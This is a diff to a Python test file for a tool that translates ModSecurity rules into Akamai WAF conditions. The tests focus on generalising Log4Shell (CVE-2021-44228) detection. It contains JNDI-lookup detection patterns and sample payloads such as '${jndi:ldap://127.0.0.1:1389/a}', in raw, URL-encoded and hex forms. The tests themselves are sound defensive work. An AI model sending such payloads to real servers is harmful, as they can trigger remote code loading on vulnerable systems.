@@ -5,21 +5,27 @@ from __future__ import annotations
 import json
 import re
 from fnmatch import fnmatchcase
+from pathlib import Path
 from urllib.parse import quote, quote_plus
 
 import pytest
 
 from control_translation import capability
 from control_translation.adapters.akamai_waf import AkamaiWafAdapter
+from control_translation.agents.translation_agent import TranslationProposal
 from control_translation.config import Settings
 from control_translation.contracts import (
     ControlTranslationRequest,
     InvokeRequestEnvelope,
+    JsonBodyFieldFeature,
+    ProofLoopRequestContext,
     ProofLoopTranslationRequirements,
     ProvenMitigationPattern,
     TargetContext,
+    TranslationPolicy,
 )
 from control_translation.terminal import TerminalState
+from control_translation.translation.engine import _akamai_deterministic_proposal
 from control_translation.translation.modsec_akamai import (
     _generalize_wildcard_transport_forms,
     _remove_subsumed_literal_wildcards,
@@ -47,12 +53,43 @@ PROVEN_SECRULE = (
     "tag:'janus-candidate'\""
 )
 
+LOSSLESS_PROVEN_SECRULE = (
+    'SecRule ARGS_POST:Researcher "@rx ^blocked$" '
+    '"id:152405,phase:2,deny,status:403,log,'
+    "msg:'JANUS candidate: block evidenced Researcher value',"
+    "tag:'janus-candidate'\""
+)
+
 LOG4SHELL_SECRULE = (
     'SecRule ARGS:address "@rx \\$\\{jndi:ldap://example\\.invalid/a'
     '(?:\\}|%7[dD])" "id:150386,phase:2,deny,status:403,log,'
     "msg:'JANUS candidate for CVE-2021-44228',tag:'janus-candidate',"
     "tag:'CVE-2021-44228'" + '"\n'
 )
+
+DG_LOG4SHELL_SECRULE = (
+    Path(__file__).parent
+    / "fixtures"
+    / "dg_log4shell_semantic_generalization.modsec"
+).read_text(encoding="utf-8")
+DG_LOG4SHELL_EXPECTED_VALUES = (
+    Path(__file__).parent
+    / "fixtures"
+    / "dg_log4shell_semantic_generalization.txt"
+).read_text(encoding="utf-8").splitlines()
+DG_LOG4SHELL_THREE_REPRESENTATION_RULE = (
+    Path(__file__).parent
+    / "fixtures"
+    / "dg_log4shell_three_representation_overflow.modsec"
+).read_text(encoding="utf-8")
+DG_LOG4SHELL_COMPACT_VALUES = [
+    "*${jndi:ldap://?*/*}*",
+    "*%24%7Bjndi%3Aldap%3A%2F%2F?*%2F*%7D*",
+    "*247b6a6e64693a6c6461703a2f2f??*2f*7d*",
+    "*${jndi:rmi://?*/*}*",
+    "*%24%7Bjndi%3Armi%3A%2F%2F?*%2F*%7D*",
+    "*247b6a6e64693a726d693a2f2f??*2f*7d*",
+]
 
 
 def _pattern(pattern_summary: str, **overrides) -> ProvenMitigationPattern:
@@ -136,15 +173,23 @@ def test_anchored_literal_compiles_to_an_exact_match_with_encodings():
     ]
 
 
-def test_header_rule_maps_to_a_named_header_value_condition():
+@pytest.mark.parametrize("header", ["X-Arbitrary-Signal", "Forwarded"])
+def test_header_rule_preserves_an_arbitrary_validated_header_name(header: str):
     rule = _compile(
-        'SecRule REQUEST_HEADERS:User-Agent "@rx \\$\\{jndi:" '
-        "\"id:2,deny,msg:'Log4Shell JNDI in User-Agent'\""
+        f'SecRule REQUEST_HEADERS:{header} "@rx \\$\\{{jndi:" '
+        '"id:2,deny,msg:\'JNDI in named request header\'"'
     )
 
     condition = _condition(rule, "requestHeaderValueMatch")
-    assert condition["header"] == "User-Agent"
+    assert condition["header"] == header
     assert condition["value"] == ["*${jndi:*"]
+
+
+@pytest.mark.parametrize("header", ["Bad,Header", "Header(Name)", "Name:Suffix"])
+def test_invalid_named_header_selector_declines(header: str):
+    rule = f'SecRule REQUEST_HEADERS:{header} "@contains blocked" "id:2,deny"'
+
+    assert compile_akamai_custom_rule(_pattern(rule)) is None
 
 
 def test_live_log4shell_rule_maps_rx_operator_to_akamai_argument_values():
@@ -174,7 +219,7 @@ def test_live_log4shell_rule_maps_rx_operator_to_akamai_argument_values():
 
 def test_bounded_structured_log4shell_rule_compiles_deterministically():
     proposal = compile_akamai_custom_rule(_pattern(
-        r'''SecRule REQUEST_BODY "@rx (?:\$\{jndi:(?:ldap|rmi)://[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?/[^\s\"'<>}]{0,512}\})" "id:109348,phase:2,deny,status:403,log,tag:'janus-candidate'"''',
+        DG_LOG4SHELL_SECRULE,
         vulnerability_id="CVE-2021-44228",
     ))
 
@@ -184,18 +229,154 @@ def test_bounded_structured_log4shell_rule_compiles_deterministically():
         json.dumps(proposal.candidate_content)
     )
     assert validation.valid, validation.errors
-    condition = _condition(proposal.candidate_content, "argsPostMatch")
+    condition = _condition(proposal.candidate_content, "requestHeaderValueMatch")
+    assert condition["header"] == "User-Agent"
     assert condition["valueWildcard"] is True
+    assert condition["value"] == DG_LOG4SHELL_EXPECTED_VALUES
     assert any("${jndi:ldap://" in value for value in condition["value"])
     assert any("${jndi:rmi://" in value for value in condition["value"])
-    assert "*${jndi:ldap://example.invalid/a}*" not in condition["value"]
-    assert (
-        "*${jndi:rmi://janus-alternate.invalid/janus-bypass-probe}*"
-        not in condition["value"]
+    assert any("?*.?*.?*.?*/" in value for value in condition["value"])
+    assert any("[??*]/" in value for value in condition["value"])
+    assert any(":?*/" in value for value in condition["value"])
+    assert any("/*}" in value for value in condition["value"])
+    for literal in (
+        "127.0.0.1",
+        "1389",
+        "message",
+        "log4j-probe.invalid",
+        "janus-alternate.invalid",
+    ):
+        assert all(literal not in value for value in condition["value"])
+    assert all(
+        item["type"] not in {"REQUEST_BODY", "requestHeaderMatch"}
+        for item in proposal.candidate_content["conditions"]
     )
-    assert all(item["type"] != "REQUEST_BODY" for item in proposal.candidate_content["conditions"])
-    assert proposal.translation_label == "narrower"
+    assert proposal.translation_label == "broader"
     assert any("broader set of requests" in item for item in proposal.limitations)
+
+
+def test_overflowing_three_representation_jndi_rule_compacts_to_clean_values():
+    first = compile_akamai_custom_rule(
+        _pattern(DG_LOG4SHELL_THREE_REPRESENTATION_RULE, vulnerability_id="CVE-2021-44228")
+    )
+    second = compile_akamai_custom_rule(
+        _pattern(DG_LOG4SHELL_THREE_REPRESENTATION_RULE, vulnerability_id="CVE-2021-44228")
+    )
+
+    assert first is not None and second is not None
+    assert first == second
+    assert first.translation_label == "broader"
+    assert isinstance(first.candidate_content, dict)
+    condition = _condition(first.candidate_content, "argsPostMatch")
+    assert condition["valueWildcard"] is True
+    assert condition["valueCase"] is True
+    assert condition["value"] == DG_LOG4SHELL_COMPACT_VALUES
+    assert len(condition["value"]) <= 32
+    assert not any(
+        token in value
+        for value in condition["value"]
+        for token in ("@rx", "(?:", "[A-", "{0,", "\\")
+    )
+    assert {"ldap", "rmi"} == {
+        protocol
+        for protocol in ("ldap", "rmi")
+        if any(protocol in value or protocol.encode().hex() in value for value in condition["value"])
+    }
+    assert any("nonempty authority" in item for item in first.limitations)
+    assert any("UTF-8 hex" in item for item in first.limitations)
+    assert any("hostname, IPv4, IPv6, port" in item for item in first.limitations)
+    assert not any("Only the decoded" in item for item in first.limitations)
+
+
+def test_carrier_jndi_secrule_precedes_concrete_form_body_fallback():
+    source = DG_LOG4SHELL_THREE_REPRESENTATION_RULE
+    source = source.replace(r"\$\{jndi:", r"message=\$\{jndi:", 1)
+    source = source.replace("%24%7Bjndi%3A", "message=%24%7Bjndi%3A", 1)
+    source = source.replace(
+        "247b6a6e64693a", "6d6573736167653d247b6a6e64693a", 1
+    )
+
+    proposal, proposal_source = _akamai_deterministic_proposal(
+        _pattern(source),
+        translation_requirements=None,
+        request_context=ProofLoopRequestContext(
+            method="POST",
+            path="/",
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            body="message=${jndi:ldap://invalid.example/a}",
+        ),
+    )
+
+    assert proposal is not None
+    assert proposal_source == "deterministic-modsec-rule"
+    condition = _condition(proposal.candidate_content, "argsPostMatch")
+    assert condition["value"] == [
+        value.replace("*${jndi:", "*message=${jndi:")
+        .replace("*%24%7Bjndi%3A", "*message=%24%7Bjndi%3A")
+        .replace("*247b6a6e64693a", "*6d6573736167653d247b6a6e64693a")
+        for value in DG_LOG4SHELL_COMPACT_VALUES
+    ]
+    assert "invalid.example" not in json.dumps(proposal.candidate_content)
+
+
+@pytest.mark.parametrize(
+    ("raw_carrier", "url_carrier", "hex_carrier"),
+    [
+        ("", "", ""),
+        ("message=", "message%3D", "6d6573736167653d"),
+        ("message=", "message=", "6d6573736167653d"),
+        ("message%3D", "message%3D", "6d6573736167653d"),
+    ],
+)
+def test_structured_jndi_carriers_preserve_each_representation(
+    raw_carrier: str,
+    url_carrier: str,
+    hex_carrier: str,
+):
+    source = DG_LOG4SHELL_THREE_REPRESENTATION_RULE
+    source = source.replace(r"\$\{jndi:", raw_carrier + r"\$\{jndi:", 1)
+    source = source.replace("%24%7Bjndi%3A", url_carrier + "%24%7Bjndi%3A", 1)
+    source = source.replace("247b6a6e64693a", hex_carrier + "247b6a6e64693a", 1)
+
+    proposal = compile_akamai_custom_rule(_pattern(source))
+
+    assert proposal is not None
+    assert isinstance(proposal.candidate_content, dict)
+    values = _condition(proposal.candidate_content, "argsPostMatch")["value"]
+    assert values[0].startswith(f"*{raw_carrier}${{jndi:ldap://")
+    assert values[1].startswith(f"*{url_carrier}%24%7Bjndi%3Aldap")
+    assert values[2].startswith(f"*{hex_carrier}247b6a6e64693a6c646170")
+
+
+def test_compacted_jndi_values_generalize_unseen_authority_and_resource():
+    proposal = compile_akamai_custom_rule(_pattern(DG_LOG4SHELL_THREE_REPRESENTATION_RULE))
+
+    assert proposal is not None
+    assert isinstance(proposal.candidate_content, dict)
+    values = _condition(proposal.candidate_content, "argsPostMatch")["value"]
+    unseen = [
+        "${jndi:ldap://unseen.example/new/resource}",
+        "%24%7Bjndi%3Armi%3A%2F%2Fnew.example%2Fother%7D",
+        "247b6a6e64693a6c6461703a2f2f6e65772e6578616d706c652f782f797d",
+    ]
+    assert all(any(fnmatchcase(item, value) for value in values) for item in unseen)
+    for sentinel in ("127.0.0.1", "example.invalid", "message", "1389"):
+        assert all(sentinel not in value for value in values)
+    for sentinel_hex in (
+        "3132372e302e302e31",
+        "6578616d706c652e696e76616c6964",
+        "6d657373616765",
+        "31333839",
+    ):
+        assert all(sentinel_hex not in value for value in values)
+
+
+def test_unknown_structured_jndi_branch_declines_without_partial_compilation():
+    source = DG_LOG4SHELL_THREE_REPRESENTATION_RULE.replace(
+        "%7D|247b6a6e64693a", "%7E|247b6a6e64693a", 1
+    )
+
+    assert compile_akamai_custom_rule(_pattern(source)) is None
 
 
 def test_structured_transport_forms_remove_all_sentinel_authorities():
@@ -266,7 +447,7 @@ def test_alternative_variables_compile_into_one_or_operation():
     ]
 
 
-def test_lossless_mapping_is_equivalent_and_generalized_mapping_is_narrower():
+def test_lossless_mapping_is_equivalent_and_generalized_mapping_is_broader():
     exact = compile_akamai_custom_rule(
         _pattern('SecRule ARGS_POST:token "@rx ^drop table users$" "id:1,deny"')
     )
@@ -274,7 +455,7 @@ def test_lossless_mapping_is_equivalent_and_generalized_mapping_is_narrower():
 
     assert exact is not None and generalized is not None
     assert exact.translation_label == "equivalent"
-    assert generalized.translation_label == "narrower"
+    assert generalized.translation_label == "broader"
     assert any(
         "broader set of requests" in item for item in generalized.limitations
     )
@@ -392,7 +573,7 @@ def _direct_request(pattern_summary: str, **overrides) -> ControlTranslationRequ
 @pytest.mark.parametrize("run_mode", ["fixture", "live"])
 def test_proven_rule_is_translated_without_the_doer_in_either_mode(run_mode: str):
     envelope = capability.invoke(
-        _direct_request(PROVEN_SECRULE),
+        _direct_request(LOSSLESS_PROVEN_SECRULE),
         settings=Settings(run_mode=run_mode, model_provider="att"),
         doer=UnexpectedDoer(),
     )
@@ -406,12 +587,69 @@ def test_proven_rule_is_translated_without_the_doer_in_either_mode(run_mode: str
     assert json.loads(candidate.candidate_artifact.content_ref)["conditions"]
 
 
+def test_broader_dg_rule_uses_default_review_path_before_mc_json_field_literals():
+    pattern = _pattern(
+        DG_LOG4SHELL_SECRULE,
+        vulnerability_id="CVE-EXAMPLE",
+        json_body_field_feature=JsonBodyFieldFeature(
+            method="POST",
+            content_type="application/json",
+            field_path=["arbitrary_probe_key"],
+            value="${jndi:ldap://127.0.0.1:1389/a}",
+            value_match="exact",
+        ),
+    )
+
+    envelope = capability.invoke(
+        ControlTranslationRequest(
+            proven_pattern=pattern,
+            target_context=TargetContext(
+                target_technology="akamai-waf",
+                target_policy_context_id="akamai-policy:example:rev-17",
+            ),
+        ),
+        doer=UnexpectedDoer(),
+    )
+
+    assert envelope.terminal_state == TerminalState.TRANSLATED
+    assert envelope.inference["proposal_source"] == "deterministic-modsec-rule"
+    assert envelope.inference["llm_invoked"] is False
+    candidate = envelope.structured_result.primary_candidate
+    assert candidate is not None
+    assert candidate.implements_discriminator.translation == "broader"
+    assert candidate.candidate_metadata is not None
+    assert candidate.candidate_metadata.semantic_relationship == "broader"
+    assert candidate.candidate_metadata.syntax_profile.deployment_ready is False
+    assert (
+        candidate.candidate_metadata.recommended_policy_binding.requires_operator_review
+        is True
+    )
+
+
+def test_broader_dg_rule_is_declined_when_policy_explicitly_denies_it():
+    envelope = capability.invoke(
+        _direct_request(DG_LOG4SHELL_SECRULE).model_copy(
+            update={
+                "translation_policy": TranslationPolicy(
+                    allow_broader_translation=False
+                )
+            }
+        ),
+        doer=UnexpectedDoer(),
+    )
+
+    assert envelope.terminal_state == TerminalState.CANNOT_EXPRESS
+    assert envelope.inference["proposal_source"] == "deterministic-modsec-rule"
+    assert envelope.structured_result.primary_candidate is None
+    assert "does not allow broader" in envelope.structured_result.outcome_reason.detail
+
+
 def test_compiled_rule_bypasses_the_discriminator_keyword_gate():
     # The adapter's cheap keyword gate does not recognize this prose, but the
     # rule itself compiles, which settles expressibility.
     envelope = capability.invoke(
         _direct_request(
-            PROVEN_SECRULE,
+            LOSSLESS_PROVEN_SECRULE,
             discriminator_description="Opaque producer prose without keywords.",
         ),
         doer=UnexpectedDoer(),
@@ -421,13 +659,120 @@ def test_compiled_rule_bypasses_the_discriminator_keyword_gate():
     assert envelope.inference["proposal_source"] == "deterministic-modsec-rule"
 
 
-def test_unmappable_rule_still_falls_back_to_the_doer():
+def test_unmappable_authoritative_rule_fails_closed_without_the_doer():
     envelope = capability.invoke(
-        _direct_request('SecRule ARGS:u "@rx ^a\\s{2,}b$" "id:8,deny"')
+        _direct_request('SecRule ARGS:u "@rx ^a\\s{2,}b$" "id:8,deny"'),
+        doer=UnexpectedDoer(),
+    )
+
+    assert envelope.terminal_state == TerminalState.CANNOT_EXPRESS
+    assert envelope.inference["proposal_source"] == "deterministic-modsec-rule"
+    assert envelope.inference["llm_invoked"] is False
+    assert "model fallback is disabled" in envelope.structured_result.outcome_reason.detail
+
+
+def test_non_secrule_prose_may_still_use_the_doer():
+    class StaticDoer:
+        def __init__(self) -> None:
+            self.calls = 0
+
+        def propose(self, **kwargs):
+            self.calls += 1
+            return TranslationProposal(
+                candidate_content={
+                    "operation": "AND",
+                    "conditions": [
+                        {
+                            "type": "argsPostMatch",
+                            "positiveMatch": True,
+                            "valueCase": True,
+                            "valueWildcard": True,
+                            "value": ["*jndi lookup*"],
+                        }
+                    ],
+                },
+                translation_label="broader",
+                justification="Translated non-executable prose.",
+            )
+
+    doer = StaticDoer()
+    envelope = capability.invoke(
+        _direct_request("Block a JNDI lookup in the request body."), doer=doer
     )
 
     assert envelope.terminal_state == TerminalState.TRANSLATED
     assert envelope.inference["proposal_source"] == "translation-doer"
+    assert doer.calls == 1
+
+
+def test_authoritative_decline_prevents_copied_source_regex_output():
+    class CopyingDoer:
+        def __init__(self) -> None:
+            self.calls = 0
+
+        def propose(self, **kwargs):
+            self.calls += 1
+            return {
+                "candidate_content": {
+                    "operation": "AND",
+                    "conditions": [
+                        {
+                            "type": "argsPostMatch",
+                            "positiveMatch": True,
+                            "valueCase": True,
+                            "valueWildcard": False,
+                            "value": [r"^a\s{2,}b$"],
+                        }
+                    ],
+                },
+                "translation_label": "equivalent",
+                "justification": "Copied the source regex.",
+            }
+
+    doer = CopyingDoer()
+    envelope = capability.invoke(
+        _direct_request('SecRule ARGS:u "@rx ^a\\s{2,}b$" "id:8,deny"'),
+        doer=doer,
+    )
+
+    assert envelope.terminal_state == TerminalState.CANNOT_EXPRESS
+    assert envelope.inference["llm_invoked"] is False
+    assert doer.calls == 0
+
+
+def test_malformed_authoritative_secrule_fails_closed_without_the_doer():
+    envelope = capability.invoke(
+        _direct_request('SecRule REQUEST_BODY "unterminated'),
+        doer=UnexpectedDoer(),
+    )
+
+    assert envelope.terminal_state == TerminalState.CANNOT_EXPRESS
+    assert envelope.inference["proposal_source"] == "deterministic-modsec-rule"
+    assert envelope.inference["llm_invoked"] is False
+
+
+def test_mixed_case_authoritative_secrule_fails_closed_without_the_doer():
+    envelope = capability.invoke(
+        _direct_request('secrule REQUEST_BODY "unterminated'),
+        doer=UnexpectedDoer(),
+    )
+
+    assert envelope.terminal_state == TerminalState.CANNOT_EXPRESS
+    assert envelope.inference["proposal_source"] == "deterministic-modsec-rule"
+    assert envelope.inference["llm_invoked"] is False
+
+
+def test_compacted_rule_declines_when_proof_values_exceed_condition_limit():
+    requirements = ProofLoopTranslationRequirements(
+        post_waf_canonical_forms=[f"required-{index}" for index in range(27)],
+    )
+
+    proposal = compile_akamai_custom_rule(
+        _pattern(DG_LOG4SHELL_THREE_REPRESENTATION_RULE),
+        translation_requirements=requirements,
+    )
+
+    assert proposal is None
 
 
 # ---------------------------------------------------------------------------
@@ -518,7 +863,7 @@ def _orchestration_records() -> dict[str, UpstreamRecord]:
                         "Submit the Researcher parameter with SQL injection "
                         "syntax and observe the authentication bypass."
                     ),
-                    "artifact_content": PROVEN_SECRULE,
+                    "artifact_content": LOSSLESS_PROVEN_SECRULE,
                 },
             },
         ),
@@ -564,6 +909,47 @@ def test_orchestration_envelope_compiles_the_referenced_rule_for_akamai():
     ).valid
     assert candidate.candidate_metadata is not None
     assert candidate.candidate_metadata.recommended_policy_binding.action == "deny"
+
+
+def test_current_orchestration_shape_translates_broader_dg_log4shell_rule():
+    records = _orchestration_records()
+    defense = records[DEFENSE_RESULT_ID]
+    records[DEFENSE_RESULT_ID] = UpstreamRecord(
+        result_id=defense.result_id,
+        terminal_state=defense.terminal_state,
+        correlation_id=defense.correlation_id,
+        subject_record_revision_id=defense.subject_record_revision_id,
+        request=defense.request,
+        result={
+            **defense.result,
+            "primary_candidate": {
+                **defense.result["primary_candidate"],
+                "artifact_content": DG_LOG4SHELL_SECRULE,
+            },
+        },
+    )
+
+    result = capability.invoke_envelope(
+        InvokeRequestEnvelope.model_validate(_orchestration_body()),
+        resolver=FakeResolver(records),
+        settings=Settings(run_mode="fixture", model_provider="none"),
+    )
+
+    assert result.terminal_state == TerminalState.TRANSLATED
+    candidate = result.structured_result.primary_candidate
+    assert candidate is not None
+    assert candidate.implements_discriminator.translation == "broader"
+    assert candidate.candidate_metadata is not None
+    assert candidate.candidate_metadata.semantic_relationship == "broader"
+    assert candidate.candidate_metadata.syntax_profile.deployment_ready is False
+    assert (
+        candidate.candidate_metadata.recommended_policy_binding.requires_operator_review
+        is True
+    )
+    rule = json.loads(candidate.candidate_artifact.content_ref)
+    condition = _condition(rule, "requestHeaderValueMatch")
+    assert condition["header"] == "User-Agent"
+    assert condition["value"] == list(DG_LOG4SHELL_EXPECTED_VALUES)
 
 
 # ---------------------------------------------------------------------------
